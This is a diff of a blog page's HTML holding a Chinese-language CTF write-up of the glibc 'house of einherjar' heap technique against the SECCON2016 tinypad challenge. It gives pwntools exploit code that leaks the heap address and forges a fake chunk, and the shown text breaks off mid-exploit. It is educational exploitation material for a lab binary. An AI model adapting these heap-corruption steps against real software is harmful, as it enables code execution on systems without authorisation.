@@ -1,31 +1,7 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
-<title>How2heap--house_of_einherjar SECON2016--tinypad - hhdx's blog</title>
-<meta name=renderer content="webkit">
-<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta http-equiv=cache-control content="no-transform">
-<meta http-equiv=cache-control content="no-siteapp">
-<meta name=theme-color content="#f8f5ec">
-<meta name=msapplication-navbutton-color content="#f8f5ec">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
-<meta name=author content="hhdx"><meta name=description content="house of einherjar 和house of force很像，都是篡改top chunk。
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>How2heap--house_of_einherjar SECON2016--tinypad - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="house of einherjar 和house of force很像，都是篡改top chunk。
 off-by-one覆盖victim chunk的pre_in_use位，并修改victim-&amp;gt;pre_size为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。
 victim需要临近top chunk，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。
-1 2 3 4  if (__builtin_expect (chunksize_nomask (victim) &amp;lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &amp;gt; av-&amp;gt;system_mem, 0)) malloc_printerr (&amp;#34;malloc(): memory corruption&amp;#34;);   "><meta name=keywords content="C language,CTF,system engineer">
-<meta name=generator content="Hugo 0.88.1 with theme even">
-<link rel=canonical href=https://hhdx.xyz/post/how2heap-house-of-einherjar-secon2016-tinypad/>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/manifest.json>
-<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
-<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
-<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
-<meta property="og:title" content="How2heap--house_of_einherjar SECON2016--tinypad">
-<meta property="og:description" content="house of einherjar
+1 2 3 4 if (__builtin_expect (chunksize_nomask (victim) &amp;lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &amp;gt; av-&amp;gt;system_mem, 0)) malloc_printerr (&amp;#34;malloc(): memory corruption&amp;#34;); "><meta name=keywords content="C language,CTF,system engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/how2heap-house-of-einherjar-secon2016-tinypad/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="How2heap--house_of_einherjar SECON2016--tinypad"><meta property="og:description" content="house of einherjar
 和house of force很像，都是篡改top chunk。
 off-by-one覆盖victim chunk的pre_in_use位，并修改victim->pre_size为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。
 victim需要临近top chunk，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。
@@ -43,13 +19,7 @@ if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
 		malloc_printerr (&#34;malloc(): memory corruption&#34;);
 
 
-">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://hhdx.xyz/post/how2heap-house-of-einherjar-secon2016-tinypad/"><meta property="article:section" content="post">
-<meta property="article:published_time" content="2020-07-23T09:57:08+00:00">
-<meta property="article:modified_time" content="2020-07-23T09:57:08+00:00">
-<meta itemprop=name content="How2heap--house_of_einherjar SECON2016--tinypad">
-<meta itemprop=description content="house of einherjar
+"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/how2heap-house-of-einherjar-secon2016-tinypad/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-23T09:57:08+00:00"><meta property="article:modified_time" content="2020-07-23T09:57:08+00:00"><meta itemprop=name content="How2heap--house_of_einherjar SECON2016--tinypad"><meta itemprop=description content="house of einherjar
 和house of force很像，都是篡改top chunk。
 off-by-one覆盖victim chunk的pre_in_use位，并修改victim->pre_size为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。
 victim需要临近top chunk，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。
@@ -67,12 +37,7 @@ if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
 		malloc_printerr (&#34;malloc(): memory corruption&#34;);
 
 
-"><meta itemprop=datePublished content="2020-07-23T09:57:08+00:00">
-<meta itemprop=dateModified content="2020-07-23T09:57:08+00:00">
-<meta itemprop=wordCount content="1978">
-<meta itemprop=keywords content="CTF,how2heap,"><meta name=twitter:card content="summary">
-<meta name=twitter:title content="How2heap--house_of_einherjar SECON2016--tinypad">
-<meta name=twitter:description content="house of einherjar
+"><meta itemprop=datePublished content="2020-07-23T09:57:08+00:00"><meta itemprop=dateModified content="2020-07-23T09:57:08+00:00"><meta itemprop=wordCount content="1984"><meta itemprop=keywords content="CTF,how2heap,"><meta name=twitter:card content="summary"><meta name=twitter:title content="How2heap--house_of_einherjar SECON2016--tinypad"><meta name=twitter:description content="house of einherjar
 和house of force很像，都是篡改top chunk。
 off-by-one覆盖victim chunk的pre_in_use位，并修改victim->pre_size为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。
 victim需要临近top chunk，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。
@@ -91,151 +56,35 @@ if (__builtin_expect (chunksize_nomask (victim) <= 2 * SIZE_SZ, 0)
 
 
 "><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
-<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
-</head>
-<body>
-<div id=mobile-navbar class=mobile-navbar>
-<div class=mobile-header-logo>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<div class=mobile-navbar-icon>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
 <span></span>
-<span></span>
-<span></span>
-</div>
-</div>
-<nav id=mobile-menu class="mobile-menu slideout-menu">
-<ul class=mobile-menu-list>
-<a href=/>
-<li class=mobile-menu-item>Home</li>
-</a><a href=/post/>
-<li class=mobile-menu-item>Archives</li>
-</a><a href=/tags/>
-<li class=mobile-menu-item>Tags</li>
-</a><a href=/links/>
-<li class=mobile-menu-item>Links</li>
-</a><a href=/about/>
-<li class=mobile-menu-item>About</li>
-</a>
-</ul>
-</nav>
-<div class=container id=mobile-panel>
-<header id=header class=header>
-<div class=logo-wrapper>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<nav class=site-navbar>
-<ul id=menu class=menu>
-<li class=menu-item>
-<a class=menu-item-link href=/>Home</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/post/>Archives</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/tags/>Tags</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/links/>Links</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/about/>About</a>
-</li>
-</ul>
-</nav>
-</header>
-<main id=main class=main>
-<div class=content-wrapper>
-<div id=content class=content>
-<article class=post>
-<header class=post-header>
-<h1 class=post-title>How2heap--house_of_einherjar SECON2016--tinypad</h1>
-<div class=post-meta>
-<span class=post-time> 2020-07-23 </span>
-</div>
-</header>
-<div class=post-toc id=post-toc>
-<h2 class=post-toc-title>文章目录</h2>
-<div class="post-toc-content always-active">
-<nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#house-of-einherjar>house of einherjar</a></li>
-<li><a href=#secon2016-tinypad>SECON2016 tinypad</a>
-<ul>
-<li><a href=#分析>分析</a></li>
-<li><a href=#总体思路>总体思路</a></li>
-<li><a href=#house-of-einherjar-1>house of einherjar</a></li>
-<li><a href=#exploit>exploit</a></li>
-</ul>
-</li>
-<li><a href=#reference>reference</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</div>
-<div class=post-content>
-<h2 id=house-of-einherjar>house of einherjar</h2>
-<p>和house of force很像，都是篡改top chunk。</p>
-<p>off-by-one覆盖victim chunk的<code>pre_in_use</code>位，并修改<code>victim->pre_size</code>为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。</p>
-<p><strong>victim需要临近top chunk</strong>，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/links/><li class=mobile-menu-item>Links</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/links/>Links</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>How2heap--house_of_einherjar SECON2016--tinypad</h1><div class=post-meta><span class=post-time>2020-07-23</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#house-of-einherjar>house of einherjar</a></li><li><a href=#secon2016-tinypad>SECON2016 tinypad</a><ul><li><a href=#分析>分析</a></li><li><a href=#总体思路>总体思路</a></li><li><a href=#house-of-einherjar-1>house of einherjar</a></li><li><a href=#exploit>exploit</a></li></ul></li><li><a href=#reference>reference</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=house-of-einherjar>house of einherjar</h2><p>和house of force很像，都是篡改top chunk。</p><p>off-by-one覆盖victim chunk的<code>pre_in_use</code>位，并修改<code>victim->pre_size</code>为距离目标地址的大小，在目标地址处伪造chunk，释放victim时，发生backward consolidate，合并到目标地址。</p><p><strong>victim需要临近top chunk</strong>，backward consolidate结束，接着与top chunk进行forward consolidate。如果不这样，这个块被放入unsorted bin，而在unsorted bin中分配会过不了以下检查。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=k>if</span> <span class=p>(</span><span class=n>__builtin_expect</span> <span class=p>(</span><span class=n>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
-              <span class=o>||</span> <span class=n>__builtin_expect</span> <span class=p>(</span><span class=n>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span>
-				   <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
-		<span class=n>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): memory corruption&#34;</span><span class=p>);</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=secon2016-tinypad>SECON2016 tinypad</h2>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>              <span class=o>||</span> <span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize_nomask</span> <span class=p>(</span><span class=n>victim</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>				   <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>		<span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc(): memory corruption&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=secon2016-tinypad>SECON2016 tinypad</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Arch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x3ff000)
-</code></pre></td></tr></table>
-</div>
-</div><h3 id=分析>分析</h3>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     amd64-64-little
+</span></span><span class=line><span class=cl>RELRO:    Full RELRO
+</span></span><span class=line><span class=cl>Stack:    Canary found
+</span></span><span class=line><span class=cl>NX:       NX enabled
+</span></span><span class=line><span class=cl>PIE:      No PIE (0x3ff000)
+</span></span></code></pre></td></tr></table></div></div><h3 id=分析>分析</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>[A] Add memo
-[D] Delete memo
-[E] Edit memo
-[Q] Quit
-</code></pre></td></tr></table>
-</div>
-</div><p>程序有一个tinypad全局变量，前0x100字节当做临时区域，后0x40存放一个结构体数组，结构体如下所示</p>
-<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200723104723145.png alt=image-20200723104723145></p>
-<p>Add：输入size，最大为0x100。后使用read_until读入数据，read_until中存在null byte off-by-one。</p>
-<p>Delete：输入所要删除索引，释放空间，size置0。没有将指针置0，这里存在指针悬空。</p>
-<p>Edit：对数据内容进行修改，使用strcpy拷贝到tinypad处，所以如果有<code>\x00</code>，这里会产生截断。且能够读入的大小为其字符串长度。</p>
-<h3 id=总体思路>总体思路</h3>
-<p>使用house of einherjar，通过指针悬空泄露堆地址，在tinypad处构造fakechunk。分配得到tinypad后0x40字节，在此处通过got泄露libc base，读出栈地址，将main函数返回地址修改为one gadget。</p>
-<p>由于edit memo的特殊性，所以没办法对诸如<code>__free_hook</code>这样的进行修改，从而想到通过libc中的environ泄露栈地址，修改函数返回地址，而且main函数的返回地址在<code>__libc_start_main</code>附近，它的地址有效字节长度和所需的一致。</p>
-<h3 id=house-of-einherjar-1>house of einherjar</h3>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[A] Add memo
+</span></span><span class=line><span class=cl>[D] Delete memo
+</span></span><span class=line><span class=cl>[E] Edit memo
+</span></span><span class=line><span class=cl>[Q] Quit
+</span></span></code></pre></td></tr></table></div></div><p>程序有一个tinypad全局变量，前0x100字节当做临时区域，后0x40存放一个结构体数组，结构体如下所示</p><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200723104723145.png alt=image-20200723104723145></p><p>Add：输入size，最大为0x100。后使用read_until读入数据，read_until中存在null byte off-by-one。</p><p>Delete：输入所要删除索引，释放空间，size置0。没有将指针置0，这里存在指针悬空。</p><p>Edit：对数据内容进行修改，使用strcpy拷贝到tinypad处，所以如果有<code>\x00</code>，这里会产生截断。且能够读入的大小为其字符串长度。</p><h3 id=总体思路>总体思路</h3><p>使用house of einherjar，通过指针悬空泄露堆地址，在tinypad处构造fakechunk。分配得到tinypad后0x40字节，在此处通过got泄露libc base，读出栈地址，将main函数返回地址修改为one gadget。</p><p>由于edit memo的特殊性，所以没办法对诸如<code>__free_hook</code>这样的进行修改，从而想到通过libc中的environ泄露栈地址，修改函数返回地址，而且main函数的返回地址在<code>__libc_start_main</code>附近，它的地址有效字节长度和所需的一致。</p><h3 id=house-of-einherjar-1>house of einherjar</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -250,52 +99,36 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>13
 </span><span class=lnt>14
 </span><span class=lnt>15
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>tinypad</span>    <span class=o>=</span> <span class=mh>0x602040</span>
-<span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x40d82</span>
-
-<span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 1: 0x30</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 2: 0x30</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 3: 0x100</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 4: 0x90</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
-
-<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 1</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
-<span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
-<span class=n>heap_base</span> <span class=o>=</span> <span class=n>heap_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>)</span>
-<span class=n>fake_size</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>tinypad</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>程序存在指针悬空，通过两次释放同样大小的fastbin chunk，第二次释放的chunk->fd处就存有了heap地址（因为fastbin头插头取）。然后计算fake size。</p>
-<p>memo 3：为目标chunk，溢出覆盖的就是它的<code>pre_in_use</code>，而且将它的chunk size控制在0x100，避免影响其<strong>后续</strong>与top chunk的合并。</p>
-<p>memo4：避免delete(3)后，<strong>此时</strong>就与top chunk合并。同时不能是fastbin大小，要保证后续delete(4)后，其与top chunk进行合并。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>tinypad</span>    <span class=o>=</span> <span class=mh>0x602040</span>
+</span></span><span class=line><span class=cl><span class=n>one_gadget</span> <span class=o>=</span> <span class=mh>0x40d82</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 1: 0x30</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 2: 0x30</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 3: 0x100</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                         <span class=c1># memo 4: 0x90</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34; #   INDEX: 1</span><span class=se>\n</span><span class=s2> # CONTENT: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>heap_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=o>~</span><span class=mh>0xfff</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fake_size</span> <span class=o>=</span> <span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>tinypad</span>
+</span></span></code></pre></td></tr></table></div></div><p>程序存在指针悬空，通过两次释放同样大小的fastbin chunk，第二次释放的chunk->fd处就存有了heap地址（因为fastbin头插头取）。然后计算fake size。</p><p>memo 3：为目标chunk，溢出覆盖的就是它的<code>pre_in_use</code>，而且将它的chunk size控制在0x100，避免影响其<strong>后续</strong>与top chunk的合并。</p><p>memo4：避免delete(3)后，<strong>此时</strong>就与top chunk合并。同时不能是fastbin大小，要保证后续delete(4)后，其与top chunk进行合并。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
 </span><span class=lnt>7
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># memo 1: 0x100</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># memo 2: 0x30</span>
-<span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># memo 3: 0x30</span>
-
-<span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>tinypad</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>           <span class=c1># consolidate with top chunk, avoid malloc unsorted bin check error</span>
-<span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>先分配处0xf8，而后使用临近的块溢出，在tinypad处构造fake chunk，释放memo4和memo1，先后与top chunk进行合并。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># memo 1: 0x100</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>                                 <span class=c1># memo 2: 0x30</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x20</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>fake_size</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>     <span class=c1># memo 3: 0x30</span>
+</span></span><span class=line><span class=cl>
